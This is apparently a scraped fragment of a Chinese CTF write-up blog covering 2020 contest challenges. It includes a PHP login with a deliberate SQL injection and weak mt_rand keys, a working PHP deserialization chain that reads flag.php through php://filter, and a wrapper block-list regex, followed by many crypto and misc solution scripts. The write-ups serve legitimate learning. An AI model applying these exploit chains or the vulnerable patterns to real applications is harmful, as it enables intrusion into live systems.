$_POST[\u0026#39;password\u0026#39;]; $Private_key = $_POST[\u0026#39;Private_key\u0026#39;]; if (($username == \u0026#39;\u0026#39;) || ($password == \u0026#39;\u0026#39;) ||($Private_key == \u0026#39;\u0026#39;)) { // 若为空,视为未填写,提示错误,并3秒后返回登录界面  header(\u0026#39;refresh:2; url=login.html\u0026#39;); echo \u0026#34;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\u0026#34;; exit; } else if($Private_key != \u0026#39;*************\u0026#39; ) { header(\u0026#39;refresh:2; url=login.html\u0026#39;); echo \u0026#34;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\u0026#34;; exit; } else{ if($Private_key === \u0026#39;************\u0026#39;){ $getuser = \u0026#34;SELECT flag FROM user WHERE username= \u0026#39;crispr\u0026#39; AND password = \u0026#39;$password\u0026#39;\u0026#34;.\u0026#39;;\u0026#39;; $link=mysql_connect(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;root\u0026#34;); mysql_select_db(\u0026#34;test\u0026#34;,$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result)){ echo \u0026#34;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#34;username\u0026#34;].\u0026#34;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#34;flag\u0026#34;].\u0026#34;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#34;; } } } } // genarate public_key function public_key($length = 16) { $strings1 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $public_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } //genarate private_key  function private_key($length = 12) { $strings2 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $private_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr\u0026#39;s private_key???   简单分析就是让你用公钥找私钥 然后连数据库 password 这里有个简单的SQL注入\n这是个伪随机数\tmt_scrand()和mt_rand() 使用脚本php_mt_seed爆破\n种子 1775196155 生成私钥 XuNhoueCDCGc\nEzpop 进去直接是源码 提示 flag在flag.php\n让学习 反序列化魔法方法\t就是个反序列化的题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  Welcome to index.php \u0026lt;?php //flag is in flag.php //WTF IS THIS? //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95 //And Crack It! class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } if(isset($_GET[\u0026#39;pop\u0026#39;])){ @unserialize($_GET[\u0026#39;pop\u0026#39;]); } else{ $a=new Show; highlight_file(__FILE__); }   思路：通过 Show 让 Modifier 来 include flag.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  \u0026lt;?php class Modifier{ protected $var=\u0026#39;php://filter/read=convert.base64-encode/resource=flag.php\u0026#39;; } class Show{ public $source; public $str; public function __construct($file) { $this-\u0026gt;source=$file; } } class Test{ public $p; public function __construct($p) { $this-\u0026gt;p=$p; } } $show1 = new Show(\u0026#39;add\u0026#39;); $show2 = new Show($show1); $m = new Modifier(); $test= new Test($m); $show1-\u0026gt;str=$test; echo urlencode(serialize($show2));   base64解码就是flag.php的源码了\nEzpop_Revenge 2020安洵杯Misc\u0026amp;Crypto writeup 总体感觉题目没啥营养，全是出烂了的考点，不过还是水个博客。\nMisc 签到 一个二维码，扫描关注公众号，恢复flag会给个假的flag，根据hint回复fl4g，得到网盘链接，里面是个word，word里是emoji，不是emojicode，base100解密就是flag\n王牌特工 磁盘取证，一个findme文件，是ext3，挂载得到一个 flagbox 和一个key.txt提示如下\n1 2  key:a_cool_key use Veracrypt   用Veracrypt挂载flagbox，一个假flag文件，提示往回看\n1  extundelete findme --restore-all   恢复fideme中删除的文件，得到一个 .coolboy.swp 的vim缓存，得到一串base64：55yf55qE5a+G56CBOnRoaXNfaXNfYV90cnVlX2tleQ==真正的密码 this_is_a_true_key，挂载得到flag\n套娃 zip题，第一层crc爆破得到密码\t!qQIdEa@#!z)\n1 2 3 4 5 6  0xea4446b6 0xed7987de 0x46fe0943 0x4be30989 0xb31975c0 0xd6bb1bef   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # from network import binascii import string def crack_crc(): crc_list = [0xea4446b6,0xed7987de,0x46fe0943,0x4be30989,0xb31975c0,0xd6bb1bef] chars = string.printable for res_crc in crc_list: for str_1 in chars: for str_2 in chars: comment = str_1 + str_2 test_crc = binascii.crc32(comment.encode()) calc_crc = test_crc \u0026amp; 0xffffffff if calc_crc == res_crc: print(comment) if __name__ == \u0026#39;__main__\u0026#39;: crack_crc()   第二层明文攻击，做的时候遇到点问题，密码出来 %3#c$v!@ 但是解密文件失败，发现原因了，伪加密去掉就可以正常解密了，或者flag.txt单独拖出来解密也行。\n得到一串fgic__notl{prwc__}az\u0026amp;ceadi@，在线解栅栏得到flag{zip\u0026amp;crc_we_can_do_it}@\nBeCare4 拿了个一血，这题到最后都450分+是我没想到的\n一个文本，想百度找找文章出处，粘贴的时候发现是零宽字节，得到压缩包密码\noh,you found the pass:RealV1siBle\r解压后得到图片，直接 silenteye 出flag\nCrypto 密码学？爆破就行了 密码签到题，就是爆破，放服务器上跑了一会\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import hashlib from string import ascii_lowercase,digits table = ascii_lowercase+digits ciphier = \u0026#39;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a\u0026#39; for a in table: for b in table: for c in table: for d in table: for e in table: for f in table: flag = \u0026#39;d0g3{71b2b5616\u0026#39;+a+b+\u0026#39;2a4639\u0026#39;+c+d+\u0026#39;7d979\u0026#39;+e+f+\u0026#39;de964c}\u0026#39; tmp = hashlib.sha256(flag).hexdigest() if tmp == ciphier: print(flag) exit()   1  d0g3{71b2b5616ee2a4639a07d979ebde964c}   easyaes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  from Crypto.Util.number import * from Crypto.Cipher import AES msg = b\u0026#39;Welcome to this competition, I hope you can have fun today!!!!!!\u0026#39; hint_key = 56631233292325412205528754798133970783633216936302049893130220461139160682777 last32 = \u0026#39;3c976c92aff4095a23e885b195077b66\u0026#39; # print(hex(hint_key)) # 0x7d3424647d3424647d3424647d34246419044357064341081e5b4901045b5119L hint = hex(hint_key)[2:10]*8 key = hint_key^eval(\u0026#39;0x\u0026#39;+hint) key = long_to_bytes(key) print(\u0026#34;key:\u0026#34;+key) # d0g3{welcomeyou} aes=AES.new(key,AES.MODE_ECB) tmp = long_to_bytes(0x3c976c92aff4095a23e885b195077b66) for i in range(4, 0, -1): tmp = aes.decrypt(tmp) tmp = long_to_bytes(bytes_to_long(tmp) ^ bytes_to_long(msg[16*(i-1):16*i])) print(tmp)   easyrsa challenge1费马小定理 开方得到m 即p\nchallenge2签到水平给个hintFlag is a 764-length number that starts with \u0026quot;太长了，就不贴了，自己跑去。\u0026quot;, and CYZ says he can solve the problem if he was given two more numbers\nchallenge3给了flag高位,e很小,CopperSmith解一波\n在线的sage跑似乎出了点小问题，解出x没问题，但是最后运算不知道为啥出错，自己把x贴回来然后long_to_bytes就行了ohhhhhhhhhhhhhhhhhhhhhhhh!You are good at math and crypto ,I hope you have fun today.We should think of not only the small plaintext attack, but also the coppersmith attack when e is smallWHAT?You say you only wanna flag and don' want to talk with me .OK,fine! The flag is : d0g3{e173c0f114c59c2bdea69c67422be407}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  from Crypto.Util.number import * from gmpy2 import * # --------------challenge 1------------- n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 c = 522627051172673216607019738378749874116772877858344748349627321977492158105699887369893079581450048789131578556338186004983533975454988450450635141267157135506032849129152411194539350100279698888357898902460651973610161382266600081865609650174137113252711515464274593530115825189780860732147803369868525723790644619452538755225868382505974710418995847979384726953915873857530098330095151094837190566851416540540805185485212577333604309698822785682707412587829684108913753204398552196441996201678339688766979634246337855516220753995430266970473808724410357458278585135750810810484678948146374963838334596646926215341 hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 # hint1 = 2 * d + 246810 * e * phi m = pow(c,hint1,n) m = iroot(m,2)[0] print(\u0026#39;m\u0026#39;,m) # 234702123 # --------------challenge 2------------- q = m e = 0x10001 n = 133561991523711714238641512987809330530212246892569593026319411449791084194115873781301422593495806927875828290629679020098834182528012835469352471635087375406306534880352693134486855968468946334439553553593196889196239169351375517588892769598963002098115826389220099548938169095670740942251209102500450728442583559710183771974489284632651296188035458586935211952691589627681567274801028577256215269233875203212438263987034556969968774119389693056239796736659926866707857937025200924828822267781445721099763436020785585453958594470906716195030613615725126057391084801585533926767137218524047259398886392592317910204988634868663634415285507325190415658931169841182499733179254162060738994027842088553562013488445789594342451823783136881968032197575016845492231433684884872631894561254381663562267075103417879327236182565223877901300392217967589154857009356640377622996801781797109089687661697856930394706016954531077165127402008444818092498106642068414208190583373314287381712963712098566595399301400378116274132918572709221391531621228936206630829355801192700264684469488261781954165940553346889395507153750291402535330239420975542926664420153925171757944018621411265539452424569343708318070259746118326558005521868356304582694159507379335214599839668805877215983938986674084063185863612335339836810044252829401409522709997562887276661672718820881541500852400369184737236082178767653725044900394959369367604992512713490494168594433000695046297712977059205623777990102604073885527049867682390577577616773090662829024271568456346362315351643767420198116229892060385453123572533267805396437865025639093881944841521458804810097550625853182396288247815370818578103543117466070812804267915674186488979548392193291727228018246788487524292081389142018151246889408421936865224469589631518283230229213787648552632437566756058034131355439709320923876063030896228165897498746898125821639893238387694549304110003941329763552493326245073779912107372271854798616245416264801377068163622812994786201580895459712414134184992440395336131037558976058298521312536969408724436512019410835904564817724243688308776888170183074838453466914170790840559860531933430176605716828492670093771129301541861534595181565621644268739349035133062776852304594204220291667924128313579203359827093150911871520605180797438668872585571501531844999598674037998642821148417473110716470439750642781609483016636419373004760601783594025036152924259863627732874940148083408474700265895269165869619971810103499607445649821 p = 689159326758330864205993810270646658558112329195746149991184055909755461246626153920231796960903018393806410715812453949253930576368274228434916375544579284365205241766136566047482065208442992856658212126772417415403473480889927931481129434854332858754668120563818975006384512615022532233244596546830392476321031156328699572283946257730515089543367929326280871305776349305346159311591820455943842203357066465523558715870586535188343603460826231817622511283563179065036619023415848694281294463836320838105950552498785365535923041927491743402053568747113507098917091780797009380675587381805253390649630338055131031679595664055361678114747608302944715308343764678875659039394225950479683967885912291399162609094622980318391045105733088508798371414996479107970975717563552614856114065668728607215268431341079233630995168600896375314067716366181300081684353583326214062788182429536300917720999423489104723824360299238754986351169209709892739317096741609428484854087163771300777717883057028145424827875496235567904291417092378448353222179114362314382900648079547647848024440220204768433974038004942869937932015294078073975703156613070125753344841550872429670559866184492945262960524545894823245933714684747784492095876370443994948425495841 c = 65553658155452064459040687299632299415295760116470555100400688788937893101658136830409082198753928673469636810831761104117535054304536941814523449491308187105740319828511969750359402834799486354958723098881095067882833993358468923611118977258293638107874383059048015701807718209929028151240509801801995570592890519253676774278321334154528938199389248563657673061299152526380072934917964488153875744843855913524788571997024947738868563951687976817548296078497817264410193882661874749304071168979787307490320366615899942861059615405569154961435894469325778407081182151320629413711622905703628430999201763846682516985530373643176026602901129520439581385946775511292435206913016381293219606333035648747877313424616408338829137581998558399694071257787294948211441360283876078405831210625321012072477187438320944119825970347654743794743846351762763177440045084761025728597526592892602263484022280653040195670941221493307430623213388669939114424884078502946247136016528925968280034099568454876076717790529204207317485416329062672971939549478648687894958552760953682796211975576320713576155031581257782352223857605149825435939889497465805857339911597479498085071301601506276220487493620870555545057189236870008182212284992968466451864806648279032294546676543599599279519394341289357968292292966055189578253350591765186079486142930848439238134776982658066494378507873003509820326863340562093906137812952544399266821679905073464535234547335867090392493005792528534561846391285698943396889671437127470587837989050518266365099789392584686615435440486086402941357614369171354355307532351370775920044953381482310949663868493911752104873824099597326393857349237228788875273525189373323552519106738497767546337587947368062413334887230166285909705065920918078052826480092129173127887307158867274895914733110276134124505178182548094607594799978378381804502097507167978950926067243870989514735314054362049917668015341349933704885009878192354865067520219676784278082055728039064858769077997521541853184489175120623176481708269464933868222226748491078319156602229948646960513946846417957356535995079525993783278312017766715177078804065822913241465133977233398851120059496221650357891946344151601586169979516826622503491746992282716591488199657450776596383692706657692673860134555990821730412919497018889046615548520878486492644159735144935329502984929679831356967030870226422768447430410031028770529758721438528263719267616233686813781828066547393953352033364851486926368090757420184816634373721 # r = n//q//p # phi = (p-1)*(q-1)*(r-1) n = n//q r = n//p phi = (p-1)*(r-1) d = invert(e,phi) hint2 = pow(c,d,n) # print(hint2) print(long_to_bytes(hint2)) \u0026#39;\u0026#39;\u0026#39; Flag is a 764-length number that starts with \u0026#34;11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047\u0026#34;, and CYZ says he can solve the problem if he was given two more numbers \u0026#39;\u0026#39;\u0026#39; # --------------challenge 3------------- e = 5 n = 14857387925078594782296815160632343246361073432459148990826882280149636079353743233970188012712079179396872746334143946166398665205889211414809061990804629906990919975187761209638578624750977626427334126665295876888197889611807587476285991599511809796600855689969285611439780660503760599419522224129074956376232480894299044645423966132497814477710701209588359243945406653547034819927990978087967107865071898215805154003530311865483912924517801551052430227039259201082691698480830966567550828053196299423168934840697637891311424286534363837640448614727396254288829197614805073711893711252067987576745683317789020760081 c = 14035143725862612299576867857272911865951893239411969382153274945929406881665641140566462510177132511558933111728871930062074990934496715765999564244916409345156132996227113853067808126894818934327468582686975383715892108247084995817427624992232755966398834682079985297050358462588989699096264155802168300026093598601350106309023915300973067720164567785360383234519093637882582163398344514810028120555511836375795523327469278186235781844951253058134566846816114359878325011207064300185611905609820210904126312524631330083758585084521500322528017455972299008481301204209945411774541553636405290572228575790342839240414 \u0026#39;\u0026#39;\u0026#39; # sagemath m_high = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047 R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = (m_high * (10**54)+ x) ** 5 - c solve = f.monic().small_roots(X=2 ^ 200, beta=1) x = solve[0] # 这里在线sage跑出来会错，直接打印x然后贴回来就好 flag = (m_high * (10**54)+ x) print(x) \u0026#39;\u0026#39;\u0026#39; flag = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047675003330981130439478093707252121278358852500850751357 print(long_to_bytes(flag))   ","description":"","id":14,"section":"posts","tags":["CTF","WP"],"title":"2020CTF WP","uri":"https://ruokeqx.gitee.io/posts/2020ctfwp/"},{"content":" misc  一“页”障目：ps\n壮言壮语：与佛论禅\n秘技·反复横跳：010editor，ps\n来拼图：手动或者python\n飞翔的刘壮：玩游戏拿flag\n吉普赛的歌姬：python\n Crypto  二战情报员刘壮：摩斯\n铠甲与萨满：凯撒\n跳跃的指尖：键盘\n成都养猪二厂：猪圈+栅栏\n规规矩矩的工作：线性代数\nbabyRSA：RSA\nSimple calculation：线性余数方程组，中国剩余定理\n韡髻猊岈：弗吉尼亚\nchildRSA：广播攻击，中国剩余定理\nStrange code：\nfunny rsa：中国剩余定理，z3，dp dq泄露，nextprime\n web  朋友的学妹：f12\nEZwww: 网站备份\n刘壮的黑页：请求方式\nWelcome：405 简单php绕过 phpinfo 包头\nEZgit: git泄露\n我是大黑客：后门连接\nezbypass：php简单绕过\n带恶人六撞: 报错注入\nMisc 一“页”障目 宣传单里flag横切了，ps一下就行\n壮言壮语 佛曰直接在线解\n1  佛曰：豆梵能佛冥謹沙怯隸道等孕喝伽訶恐奢耶尼殿怯怖奢三缽南怛缽娑皤寫數皤究呐者醯皤勝孕皤顛皤耶夜哆悉侄羯涅悉怯老若俱勝菩知菩所蘇奢以梵世心亦呐耨夷哆至哆醯即波怯明除怯闍怯集怯尼明皤實怯一心缽呼侄羯夢室諳耨呐提迦梵都都呐孕礙諳那呐彌豆缽智遮諳槃提伽俱穆離冥伊冥那藐罰摩迦諳有諳盡即怯多逝侄婆冥涅神   秘技·反复横跳 zip里有个图片，图片尾部有个zip，手拿也行，binwalk也行，得到左右换的二维码，ps恢复一下就行\n飞翔的刘壮 游戏题，只有在第11个柱子死才有flag。\n来拼图 拼图题出过好多了，可以手撕，也可以拿个脚本找出不一样的然后ps一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  from cv2 import cv2 from PIL import Image import os import shutil target = cv2.imread(\u0026#34;./source.jpg\u0026#34;) def match(temp_file): template = cv2.imread(temp_file) theight, twidth = template.shape[:2] result = cv2.matchTemplate(target,template,cv2.TM_SQDIFF_NORMED ) cv2.normalize( result, result, 0, 1, cv2.NORM_MINMAX, -1 ) min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result) return abs(min_val) os.mkdir(\u0026#34;./selected\u0026#34;) dst_path=\u0026#34;./selected\u0026#34; dirs = os.listdir(\u0026#34;./pingTu\u0026#34;) count=0 for k in dirs: if(k.endswith(\u0026#39;jpg\u0026#39;)): count+=1 print(\u0026#34;processing on pic\u0026#34;+str(count)) real_path=os.path.join(\u0026#34;./pingTu\u0026#34;,k) rect=match(real_path) if rect\u0026gt;1e-10: print(rect) shutil.move(real_path,dst_path) else: continue   Crypoto 二战情报员刘壮 1  你能知道刘壮在说什么？得到的flag包裹上SYC{} .-../.----/..-/--../..../..-/....-/-./--./..--.-/../..--.-/--../.----/-.--/.----   摩斯密码解密就行，照着表也行，在线解密也行\n铠甲与萨满 1  YEI{roafnagtmroafnagtm_hgtmhgtmhgtm}   凯撒加密，一种最简单的位移密码，在线解密也行，手撕也行，自己写个脚本也行\n跳跃的指尖 1  题目描述:wdr qsz awdx thu xdv eft thu ol rgy ilp(注意请将请将答案套上SYC{}提交)   低头看你的键盘，被这些字母包围的按键拼起来就是flag\n成都养猪二厂 手解猪圈密码得到如下\n1  SSYIRCEEHSAGIULISOLBHY   http://www.metools.info/code/railfencecipher_154.html\n在线解栅栏 key7得到\n1  SYCHISHOUSEISREALLYBIG   规规矩矩的工作 hint希尔，求逆矩阵然后乘enc模26\n1 2 3 4 5 6 7 8 9 10 11  import numpy as np from string import ascii_uppercase a = [[3,23,1],[23,5,24],[1,24,1]] enc = [[12],[12],[10]] out = [\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;] x = np.matmul(a,enc) # print(x) for i in range(3): out[i] = ascii_uppercase[x[i][0]%26] print(\u0026#39;\u0026#39;.join(out))   babyRSA 啥都有了，就是rsa基础\n1 2 3 4 5 6 7 8 9 10 11 12 13  import gmpy2 from Crypto.Util.number import * c = 177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194 q = 166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043 n = 191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149 p = n//q e = 0x10001 phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = gmpy2.powmod(c, d, n) print(long_to_bytes(m))   Simple calculation 很短直接爆破就行\n1 2 3 4 5 6 7 8 9  from string import ascii_uppercase as table for s0 in range(26): for s1 in range(26): for s2 in range(26): for s3 in range(26): for s4 in range(26): if (s0+s1+s2+s3+s4)%26==3 and (s0+s1+s2+s3*3+s4*5)%26==7 and (s0+s1*2+s2*2+s3*3+s4*3)%26==1 and (s0+s1*2+s2*5+s3*3+s4)%26==1 and (s0+s1*2+s2+s3*2+s4)%26==20: print(s0,s1,s2,s3,s4) print(\u0026#34;SYC{\u0026#34;+table[s0]+table[s1]+table[s2]+table[s3]+table[s4]+\u0026#34;}\u0026#34;)   韡髻猊岈 弗吉尼亚密码，在线解密就行\nchildRSA 广播攻击\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # coding=utf-8 import gmpy2 from Crypto.Util.number import * def CRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % M n = [] c = [] n1 = 0xe096219878f492bcdb2a2d03995521e7a65125733bae18e7d0005e35343fea3653698de60231d29b2d1b44a0b4ffd3183855b9042275f769e1702fa8843062df0938821db0258af40ab3cda8e54eb6ac826d545df91dfe76266cb01b1d6fad39e6ef13ce730c1c2395136b0bbdf22c6b0daba63701d71c6ae70d4e06935b9941 c1 = 0xff24bddc5a7b327535af92dba58c5d62a22d542e6ba1df6f91c98c7563d8e48e770fb623bfcc2f09ed49788293306ff709670b225da32ea134422d5e403b11c39ef6b144f96b2fe94b3aa136432ecea86a4069a4cb0b4d8570edb3fb5bb2cf0693184ef0c589887b012ebe6ea94e854a71a7eb768133d15e784e388976877db n2 = 0xa36b15a395edf3e99927f658e22d5f4aefd83434972c96cca5242a1aaa517ad83739451269723092dd9e73c00682dd3bbd74a985546def88196119b6d57b397283bc7b8b6029916df84284bec1725f6e5d3d29042af685c508a58ab6fb4e5bfeb326ae49330e3f4426abc1860ca4412feb976ee571075a47b854c9a6f5f0ebff c2 = 0x895f8283e2200bab1bf938ce3b5e42147b53a5178e436ea0b64a2380ba99776d5ba8046ef722858b20d9650ee68c09e905030f1634e0b32397b7b12236a5a301e5923a294ef1bdf16458f4fc8677370ce2ce3d0fd957da7466e5b104191d454455917147f3187b758c1c468db1b35514391e5b36bd1ac39e91bbb24fdbc07872 n3 = 0x9d4732db2539d1166dc6865670be11951bf49295bc8c472f34682a0fb7f2b3ba96dcfa1945c2e4685dfeae5255abe2ab3b7fb2282971bb16ce02d14082f71755e8a65c956e114336914a409a9f1158fb362a92c4e169fa3c460ea26fb5c6693447b14f1c3156a2d9308dd993d7ea708a00ad149fb77109d8a5f77de1703ba249 c3 = 0x3bead3d6760bff4de22562978d4722bb21ee4792ebdb32703b6df9ff5176e033e97ad8fc81467f4b3df7bd4e8bcae09462f3eca93a3da1cd9d7e8de3e464471fdd0b70112c1c738b0daa2a37a65331eaa8954b81b410f62a0280da32eb3e305782d5f774d814ca0adb13344687387cf72657dc21724bcf69da810d7635b99467 n.extend([n1,n2,n3]) c.extend([c1,c2,c3]) m3 = GCRT(n, c) print(m3[0]) m = gmpy2.iroot(m3[0], 3)[0] print(m) print(long_to_bytes(m))   Strange code funny rsa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  import gmpy2 from sympy import nextprime from Crypto.Util.number import * from z3 import * c= 29481634166275444081755526650435050746177271929108540340839636645290382212801883156176249297905065394477723980727035074018048212479803055923507504121830977544547768817541693745091881774043457256431594076739380675412845360130106309932588508902347792967474645133565825400509525159035854284711152310367992325935 dp= 8488018598582161778909675874955311952104108410770019733352933135643797561752804534164335792268466126138022884715691928735179876112592458061466852929011221 dq= 1804557936862041610503694621208928380602760766763762174784442626117998593478392526552839638322965598840334590533505416988939157674783742124641579057347585 C_= 167991288045303000655678332469702456156006927056795988184486782639594811154157430883888171768898616013017469226146528316669411009693161813068877601341794154799154579698061130344409936572057393406182997791983691902804474594459551816221476117792337686268697787228149355295256968844786104832801764130261045846806268887759441150366851268084155967124558636130241419050274900078069517490749660442582935909745378880450868778768818202112172222446341661337699089743565266 N_= 1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258287506501285068163017195211966134698458111181058182005585938681465830111118867709096243399041372276386809721333892464112085735367452600541715292290079220522270815111077388426606567096816463177229069700881806969035414147663217609196771833717652147248133905228806566277089964340350926709132880091484440081291867 PHI_= 1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258165887575210803576766535149248650990306655744681050265422300794686668511098707335740896061248758188315389043730123141479632359506080499922725994127962549611715479724233268459284756489870354300620746588895051518136083710196648747569108450588260775600203396574920477102242310852948444452793222038768500472297680 E_ = 0x10001 D_ = gmpy2.invert(E_, PHI_) M_ = pow(C_, D_, N_) print(\u0026#34;hint: \u0026#34;,long_to_bytes(M_)) # ------------------------------------------------------ e = 0x10001 s = Solver() p_ = Int(\u0026#39;p_\u0026#39;) q_ = Int(\u0026#39;q_\u0026#39;) s.add(p_*q_==1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258287506501285068163017195211966134698458111181058182005585938681465830111118867709096243399041372276386809721333892464112085735367452600541715292290079220522270815111077388426606567096816463177229069700881806969035414147663217609196771833717652147248133905228806566277089964340350926709132880091484440081291867) s.add((p_-1)*(q_-1)==1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258165887575210803576766535149248650990306655744681050265422300794686668511098707335740896061248758188315389043730123141479632359506080499922725994127962549611715479724233268459284756489870354300620746588895051518136083710196648747569108450588260775600203396574920477102242310852948444452793222038768500472297680) if s.check() == sat: print(s.model()) # [q_ = 9386490551412435844811502505319278002577937841221881957073276159551090488386896450977177594453235429471397541114726559808406428210587601020931333624410531, # p_ = 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657] p_ = 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657 q = nextprime(gmpy2.iroot(p_, 2)[0]) tmp = q while True: tmp = tmp-1 if isPrime(tmp): print(\u0026#34;p:\u0026#34;, int(tmp)) p = int(tmp) I = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m=(((mp-mq)*I)%p)*q+mq print(long_to_bytes(m)) break   web 带恶人六撞 1 